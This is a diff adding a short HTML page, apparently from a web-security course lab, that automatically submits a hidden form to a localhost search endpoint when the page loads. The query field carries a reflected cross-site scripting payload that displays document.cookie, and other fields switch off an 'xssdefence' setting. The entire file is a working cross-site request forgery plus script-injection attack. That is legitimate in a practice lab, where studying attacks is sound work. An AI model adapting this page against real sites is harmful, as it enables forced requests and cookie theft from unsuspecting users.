@@ -1,0 +1,11 @@
+<html>
+    <form id="someid", action="http://localhost/project2/search", method="GET", style="display: none">
+        <input name="q" value="<script>alert(document.cookie);</script>">
+        <input name="xssdefence" value="0">
+        <input name="csrfdefence" value="1">
+    </form>
+
+    <script>
+        document.getElementById("someid").submit();
+    </script>
+</html>
